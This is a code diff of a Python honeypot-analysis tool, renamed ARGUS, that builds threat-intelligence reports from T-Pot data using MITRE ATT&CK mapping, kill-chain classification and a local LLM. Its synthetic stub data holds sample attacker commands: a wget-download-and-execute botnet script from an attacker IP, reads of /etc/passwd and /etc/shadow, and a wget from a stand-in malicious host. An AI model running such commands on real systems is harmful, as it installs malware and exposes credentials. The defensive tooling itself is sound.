@@ -1,97 +1,81 @@
 """
-T-Pot LLM Analyser
-------------------
-Generates plain-English threat intelligence reports from T-Pot honeypot data using
-a local LLM (Ollama + llama3.2:3b).
+ARGUS — Automated Low-Interaction Honeypot with Threat Intelligence Visualization
+--------------------------------------------------------------------------------
+Local LLM-powered threat intelligence report generator for T-Pot honeypot data.
 
 Modes:
     --test-ollama        : smoke test Ollama end-to-end (no ES needed)
     --stub               : run full pipeline against realistic synthetic data
-                           (unblocks template iteration before real ES integration)
     --period {daily,weekly,monthly}
-    --style {brief,full} : brief = SME executive brief, full = analyst detail
-    --theme {dark,light} : chart/report theme; dark for on-screen, light for print
+    --style {brief,full} : brief = executive brief; full = analyst detail
+    --theme {dark,light} : chart/report theme
 
-Pipeline (both --stub and real-data modes):
-    1. Collect raw honeypot events for the window
-    2. Aggregate to summary metrics (top countries, ports, IPs, credentials)
-    3. Extract session-level commands and classify with MITRE ATT&CK
-    4. Classify session distribution across Cyber Kill Chain stages
-    5. Generate NIST CSF-aligned recommendations
-    6. Render matplotlib charts (geo, ports, ATT&CK heatmap, kill chain, hourly)
-    7. Feed structured data + kill chain narrative to Ollama for prose narrative
-    8. Render Markdown report template with narrative + charts + tables
-    9. Save to reports/
+Pipeline:
+    1. Aggregate honeypot events into summary metrics
+    2. Classify commands against MITRE ATT&CK
+    3. Classify sessions across Cyber Kill Chain stages
+    4. Generate NIST CSF-aligned recommendations
+    5. Render charts (matplotlib, Aurora Ops theme)
+    6. Generate narrative prose via Ollama LLM
+    7. Render Jinja2 report template → Markdown
+    8. Save to reports/ (convertible to PDF/DOCX via pandoc)
 """
 from __future__ import annotations
 
 import argparse
 import os
-import random
 import sys
 from datetime import datetime, timedelta
 from pathlib import Path
-from typing import Dict, Any, List
+from typing import Dict, Any
+from zoneinfo import ZoneInfo
 
 import requests
 import yaml
 from jinja2 import Environment, FileSystemLoader, select_autoescape
 
-# Local framework modules
 from frameworks.mitre_mapper import MitreMapper
 from frameworks.kill_chain import KillChainClassifier, KILL_CHAIN_STAGES
 from frameworks.nist_csf import NistCsfGenerator
 import charts
 
 
-# ----------------------------------------------------------------------------
-# Config
-# ----------------------------------------------------------------------------
+# ---------------------------------------------------------------- config
 def load_config(path: str) -> dict:
     with open(path, "r") as f:
         return yaml.safe_load(f)
 
 
-# ----------------------------------------------------------------------------
-# Ollama client
-# ----------------------------------------------------------------------------
-def  call_ollama(prompt: str, model: str, base_url: str, timeout: int = 300) -> str:
-    """Send prompt to Ollama /api/generate and return the text response."""
+# ---------------------------------------------------------------- Ollama
+def call_ollama(prompt: str, model: str, base_url: str,
+                temperature: float = 0.3, timeout: int = 300) -> str:
+    """Send prompt to Ollama /api/generate and return the response text."""
     url = f"{base_url}/api/generate"
     payload = {
         "model": model,
         "prompt": prompt,
         "stream": False,
-        "options": {"temperature": 0},   # ← add this for reproducible output during iteration
+        "options": {"temperature": temperature},
     }
     response = requests.post(url, json=payload, timeout=timeout)
     response.raise_for_status()
     return response.json()["response"]
 
 
-# ----------------------------------------------------------------------------
-# Elasticsearch (stub for now — real queries are a next-session task)
-# ----------------------------------------------------------------------------
+# ---------------------------------------------------------------- ES (stub for now)
 def query_elasticsearch(config: dict, hours: int) -> Dict[str, Any]:
-    """Query T-Pot Elasticsearch for the specified window.
-
-    Currently returns an empty structure. Real implementation will connect via
-    SSH tunnel or Nginx-proxied Kibana ES endpoint.
-    """
-    # TODO: implement real queries in a later session
+    """Query T-Pot Elasticsearch. STUB — real implementation is a next-session task."""
     return {"total_attacks": 0, "unique_source_ips": 0, "top_source_countries": [],
             "top_attacked_ports": [], "top_credentials_attempted": [],
             "top_source_ips": [], "notable_sessions": [], "malware_hashes": [],
-            "hourly_trend": [], "session_details": []}
+            "hourly_trend": [], "session_details": [], "all_commands": []}
 
 
-# ----------------------------------------------------------------------------
-# Realistic synthetic data for --stub mode
-# ----------------------------------------------------------------------------
+# ---------------------------------------------------------------- Stub data
 def generate_stub_data(hours: int = 24) -> Dict[str, Any]:
-    """Produce realistic-looking synthetic T-Pot output for template iteration."""
-    random.seed(42)  # reproducible for template development
-
+    """Realistic synthetic T-Pot output for template iteration before real ES hookup."""
+    import random
+    random.seed(42)
     return {
         "total_attacks": 1847,
         "unique_source_ips": 342,
@@ -144,13 +128,12 @@ def generate_stub_data(hours: int = 24) -> Dict[str, Any]:
         "hourly_trend": [45, 38, 52, 41, 67, 89, 112, 134, 156, 145, 132, 128,
                          119, 108, 94, 87, 76, 62, 54, 48, 43, 38, 34, 45],
         "notable_sessions": [
-            "Session S-1247 from 45.61.185.100 (China) attempted 52 SSH login combinations in 8 seconds, then successfully authenticated as root:123456. Attacker executed `uname -a; cat /proc/cpuinfo; wget http://45.61.185.100/x86.sh; chmod +x x86.sh; ./x86.sh` — clear Mirai-family botnet enrollment attempt. Cowrie terminated after ~12s.",
+            "Session S-1247 from 45.61.185.100 (China) attempted 52 SSH login combinations in 8 seconds, then successfully authenticated as root:123456. Attacker executed `uname -a; cat /proc/cpuinfo; wget http://45.61.185.100/x86.sh; chmod +x x86.sh; ./x86.sh` — Mirai-family botnet enrollment attempt. Cowrie terminated after ~12s.",
             "Session S-1583 from 178.62.109.45 (US) sent 47 SMB negotiation packets against Dionaea port 445 within a 3-second window — pattern consistent with EternalBlue vulnerability scanning. No successful exploitation observed.",
             "Session S-1892 from 185.220.101.15 (Netherlands / Tor exit node) attempted 189 MySQL login combinations against port 3306, exclusively targeting root and admin usernames. Fully automated brute force; no post-auth activity.",
             "Session S-2104 from 94.102.51.28 (Russia) authenticated to Cowrie as ubuntu:ubuntu and executed `whoami; id; sudo -l; cat /etc/passwd; cat /etc/shadow; history` — reconnaissance for privilege escalation opportunity.",
             "Session S-2417 from 203.0.113.42 (China) attempted URL path enumeration on port 80 against Snare, requesting 34 known WordPress admin paths (`/wp-admin`, `/wp-login.php`, `/xmlrpc.php`) — commodity CMS scanner.",
         ],
-        # Session dicts for kill chain classification
         "session_details": [
             {"auth_success": True, "commands_executed": 5, "file_downloads": 1,
              "persistence_actions": 0, "c2_indicators": 0} for _ in range(3)
@@ -161,7 +144,6 @@ def generate_stub_data(hours: int = 24) -> Dict[str, Any]:
             {"auth_success": False, "failed_auth_attempts": 50, "commands_executed": 0,
              "file_downloads": 0} for _ in range(1838)
         ],
-        # Commands executed across all sessions (for MITRE mapping)
         "all_commands": [
             "uname -a", "cat /proc/cpuinfo", "wget http://mal.example/x.sh",
             "chmod +x x.sh", "whoami", "id", "sudo -l",
@@ -172,32 +154,26 @@ def generate_stub_data(hours: int = 24) -> Dict[str, Any]:
     }
 
 
-# ----------------------------------------------------------------------------
-# Pipeline
-# ----------------------------------------------------------------------------
-def run_pipeline(
-    config: dict,
-    data: Dict[str, Any],
-    style: str,
-    hours: int,
-    output_dir: str,
-    theme: str = "dark",
-) -> str:
-    """End-to-end: classify → chart → LLM narrative → template render → save."""
+# ---------------------------------------------------------------- Pipeline
+def run_pipeline(config: dict, data: Dict[str, Any], style: str,
+                 hours: int, output_dir: str, theme: str = "dark") -> str:
+    system = config["system"]
+    org = config["report"]["organization"]
+    tz = ZoneInfo(config["report"].get("timezone", "UTC"))
 
-    # -------- MITRE ATT&CK classification --------
+    # ---- MITRE ATT&CK ----
     mapper = MitreMapper()
     observations = mapper.map_commands(data["all_commands"])
     mitre_tactic_freq = mapper.tactic_frequency(observations)
     mitre_technique_freq = mapper.technique_frequency(observations)
     heatmap_data = mapper.heatmap_matrix(observations)
 
-    # -------- Kill Chain classification --------
+    # ---- Kill Chain ----
     classifier = KillChainClassifier()
     kc_distribution = classifier.classify_batch(data["session_details"])
     kc_narrative = classifier.stage_narrative(kc_distribution)
 
-    # -------- NIST CSF recommendations --------
+    # ---- NIST CSF ----
     csf_generator = NistCsfGenerator()
     if style == "brief":
         recommendations = csf_generator.generate(
@@ -208,7 +184,7 @@ def run_pipeline(
             unique_source_ips=data["unique_source_ips"],
             max_recommendations=5,
         )
-    else:  # full
+    else:
         recommendations = csf_generator.generate(
             tactic_frequency=mitre_tactic_freq,
             kill_chain_distribution=kc_distribution,
@@ -218,38 +194,27 @@ def run_pipeline(
             per_function_min=2,
         )
 
-    # -------- Charts --------
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    # ---- Charts ----
+    ts = datetime.now(tz).strftime("%Y%m%d_%H%M%S")
     chart_dir = Path(output_dir) / f"charts_{ts}_{theme}"
     chart_dir.mkdir(parents=True, exist_ok=True)
 
-    chart_geo = charts.plot_geo_origins(
-        data["top_source_countries"], str(chart_dir / "geo.png"), theme=theme,
-    )
-    chart_ports = charts.plot_port_targeting(
-        data["top_attacked_ports"], str(chart_dir / "ports.png"), theme=theme,
-    )
-    chart_hourly = charts.plot_hourly_trend(
-        data["hourly_trend"], str(chart_dir / "hourly.png"), theme=theme,
-    )
-    chart_kill_chain = charts.plot_kill_chain_distribution(
-        kc_distribution, str(chart_dir / "kill_chain.png"), theme=theme,
-    )
-    chart_mitre_heatmap = charts.plot_attack_tactics_heatmap(
-        heatmap_data, str(chart_dir / "mitre_heatmap.png"), theme=theme,
-    )
+    chart_geo = charts.plot_geo_origins(data["top_source_countries"], str(chart_dir / "geo.png"), theme=theme)
+    chart_ports = charts.plot_port_targeting(data["top_attacked_ports"], str(chart_dir / "ports.png"), theme=theme)
+    chart_hourly = charts.plot_hourly_trend(data["hourly_trend"], str(chart_dir / "hourly.png"), theme=theme)
+    chart_kill_chain = charts.plot_kill_chain_distribution(kc_distribution, str(chart_dir / "kill_chain.png"), theme=theme)
+    chart_mitre_heatmap = charts.plot_attack_tactics_heatmap(heatmap_data, str(chart_dir / "mitre_heatmap.png"), theme=theme)
 
-    # -------- LLM narrative --------
+    # ---- LLM narrative ----
     prompts_env = Environment(
         loader=FileSystemLoader("prompts"),
         autoescape=select_autoescape(disabled_extensions=("j2",)),
     )
-    prompt_file = f"daily_{style}.j2"
-    prompt_template = prompts_env.get_template(prompt_file)
-
+    prompt_template = prompts_env.get_template(f"daily_{style}.j2")
     prompt_context = {
         "data": data,
         "window_hours": hours,
+        "system_name": system["name"],
         "kill_chain_narrative": kc_narrative,
         "kill_chain_distribution": kc_distribution,
         "mitre_tactic_freq": mitre_tactic_freq,
@@ -257,51 +222,56 @@ def run_pipeline(
     }
     prompt_text = prompt_template.render(**prompt_context)
 
-    print(f"→ Calling Ollama at {config['ollama']['base_url']} with model '{config['ollama']['model']}'...")
-    print(f"  Prompt length: {len(prompt_text)} chars")
+    print(f"  → Calling Ollama at {config['ollama']['base_url']} model='{config['ollama']['model']}' temp={config['ollama'].get('temperature', 0.3)}...")
+    print(f"    Prompt length: {len(prompt_text)} chars")
 
     narrative_text = call_ollama(
         prompt=prompt_text,
         model=config["ollama"]["model"],
         base_url=config["ollama"]["base_url"],
+        temperature=config["ollama"].get("temperature", 0.3),
         timeout=config["ollama"].get("timeout", 300),
     )
-    print(f"  Received {len(narrative_text)} chars of narrative from LLM")
+    print(f"    Received {len(narrative_text)} chars of narrative")
 
-    # -------- Split narrative into sections --------
-    # Both prompts instruct the LLM to write N sections separated by blank lines,
-    # no headings. We split on double newlines and take the first N.
     n_sections = 3 if style == "brief" else 5
     raw_sections = [s.strip() for s in narrative_text.split("\n\n") if s.strip()]
     sections = raw_sections[:n_sections]
     while len(sections) < n_sections:
         sections.append("*(LLM did not produce this section — regenerate or edit template.)*")
 
-    # -------- Render report template --------
+    # ---- Template render ----
     env = Environment(
         loader=FileSystemLoader("templates"),
         autoescape=select_autoescape(disabled_extensions=("j2",)),
     )
     env.filters["number_format"] = lambda n: f"{n:,}"
-    template_file = f"report_{style}.md.j2"
-    template = env.get_template(template_file)
+    template = env.get_template(f"report_{style}.md.j2")
 
-    now = datetime.now()
-    window_end = now
+    now = datetime.now(tz)
     window_start = now - timedelta(hours=hours)
 
     render_context = {
+        # Branding
+        "system_name": system["name"],
+        "system_tagline": system["tagline"],
+        "system_version": system["version"],
+        "organization": org,
+        # Timing
         "report_date": now.strftime("%Y-%m-%d"),
+        "report_datetime": now.strftime("%Y-%m-%d %H:%M %Z"),
         "generated_at": now.isoformat(timespec="seconds"),
         "window_hours": hours,
         "window_start": window_start.strftime("%Y-%m-%d %H:%M"),
-        "window_end": window_end.strftime("%Y-%m-%d %H:%M"),
+        "window_end": now.strftime("%Y-%m-%d %H:%M"),
         "theme": theme,
+        # Data
         "data": data,
         "mitre_tactic_freq": mitre_tactic_freq,
         "mitre_technique_freq": mitre_technique_freq,
         "kill_chain_distribution": kc_distribution,
         "recommendations": recommendations,
+        # Charts (paths relative to output_dir so images render in place)
         "chart_geo": os.path.relpath(chart_geo, output_dir),
         "chart_ports": os.path.relpath(chart_ports, output_dir),
         "chart_hourly": os.path.relpath(chart_hourly, output_dir),
@@ -314,71 +284,76 @@ def run_pipeline(
 
     report_body = template.render(**render_context)
 
-    # -------- Write report to disk --------
+    # ---- Save ----
     output_path = Path(output_dir)
     output_path.mkdir(parents=True, exist_ok=True)
-    filename = f"report_{style}_{theme}_{ts}.md"
+    filename = f"{system['name'].lower()}_{style}_{theme}_{ts}.md"
     filepath = output_path / filename
     filepath.write_text(report_body)
-
     return str(filepath)
 
 
-# ----------------------------------------------------------------------------
-# CLI
-# ----------------------------------------------------------------------------
+# ---------------------------------------------------------------- CLI
+def print_banner(system: dict) -> None:
+    name = system["name"]
+    tagline = system["tagline"]
+    version = system["version"]
+    bar = "═" * (max(len(tagline), 60) + 4)
+    print(f"╔{bar}╗")
+    print(f"║  {name} v{version}".ljust(len(bar) + 2) + "  ║")
+    print(f"║  {tagline}".ljust(len(bar) + 2) + "  ║")
+    print(f"╚{bar}╝")
+
+
 def main() -> int:
-    parser = argparse.ArgumentParser(description="T-Pot LLM Threat Analyser")
-    parser.add_argument("--config", default="config.yml", help="Path to config file")
+    parser = argparse.ArgumentParser(description="ARGUS — Automated Honeypot Threat Intelligence")
+    parser.add_argument("--config", default="config.yml")
     parser.add_argument("--period", choices=["daily", "weekly", "monthly"], default="daily")
-    parser.add_argument("--style", choices=["brief", "full"], default="brief",
-                        help="brief = SME executive brief; full = analyst detail")
-    parser.add_argument("--stub", action="store_true",
-                        help="Use realistic synthetic data instead of real Elasticsearch")
-    parser.add_argument("--theme", choices=["dark", "light"], default="dark",
-                        help="Chart/report theme — dark for on-screen, light for print")
-    parser.add_argument("--test-ollama", action="store_true",
-                        help="Smoke test Ollama end-to-end (no ES / no report generated)")
+    parser.add_argument("--style", choices=["brief", "full"], default="brief")
+    parser.add_argument("--stub", action="store_true", help="Use synthetic data")
+    parser.add_argument("--theme", choices=["dark", "light"], default="dark")
+    parser.add_argument("--test-ollama", action="store_true", help="Ollama smoke test only")
     args = parser.parse_args()
 
-    # --test-ollama shortcut
     if args.test_ollama and not os.path.exists(args.config):
-        config = {"ollama": {"base_url": "http://localhost:11434", "model": "llama3.2:3b", "timeout": 120}}
+        config = {
+            "system": {"name": "ARGUS", "tagline": "Threat Intelligence Analyser", "version": "0.1"},
+            "ollama": {"base_url": "http://localhost:11434", "model": "llama3.2:3b", "timeout": 120, "temperature": 0.3},
+        }
     else:
         config = load_config(args.config)
 
+    print_banner(config["system"])
+
     if args.test_ollama:
         prompt = "In one sentence, explain what a low-interaction honeypot is in cybersecurity."
-        print(f"→ Testing Ollama at {config['ollama']['base_url']}...")
-        response = call_ollama(prompt=prompt, model=config["ollama"]["model"],
-                               base_url=config["ollama"]["base_url"],
+        print(f"→ Ollama smoke test at {config['ollama']['base_url']}...")
+        response = call_ollama(prompt, config["ollama"]["model"], config["ollama"]["base_url"],
+                               temperature=config["ollama"].get("temperature", 0.3),
                                timeout=config["ollama"].get("timeout", 120))
-        print(f"\nOllama response:\n{response}\n")
+        print(f"\n{response}\n")
         return 0
 
-    # Determine window hours
     hours_map = {"daily": 24, "weekly": 168, "monthly": 720}
     hours = hours_map[args.period]
 
-    # Get data — stub or real ES
     if args.stub:
-        print(f"→ Using STUB synthetic data ({args.period}, {hours}h window)")
+        print(f"→ Synthetic data mode ({args.period}, {hours}h window)")
         data = generate_stub_data(hours)
     else:
-        print(f"→ Querying Elasticsearch for last {hours}h...")
+        print(f"→ Querying Elasticsearch (last {hours}h)...")
         data = query_elasticsearch(config, hours)
         if data["total_attacks"] == 0:
-            print("⚠ Zero events returned from Elasticsearch. Run with --stub for template iteration.")
+            print("⚠ No ES data returned. Use --stub for template iteration.")
             return 1
 
-    # Run pipeline
-    output_dir = config.get("report", {}).get("output_dir", "reports")
+    output_dir = config["report"]["output_dir"]
     filepath = run_pipeline(config, data, args.style, hours, output_dir, args.theme)
 
-    print(f"\n✓ Report written to: {filepath}")
-    print(f"  Preview: cat '{filepath}' | head -60")
-    print(f"  Convert to PDF: pandoc '{filepath}' -o '{filepath.replace('.md', '.pdf')}'")
-    print(f"  Convert to DOCX: pandoc '{filepath}' -o '{filepath.replace('.md', '.docx')}'")
+    print(f"\n✓ Report written: {filepath}")
+    pdf_path = filepath.replace(".md", ".pdf")
+    print(f"  PDF:  pandoc '{filepath}' -o '{pdf_path}' --pdf-engine=xelatex")
+    print(f"  DOCX: pandoc '{filepath}' -o '{filepath.replace('.md', '.docx')}'")
     return 0
 
 
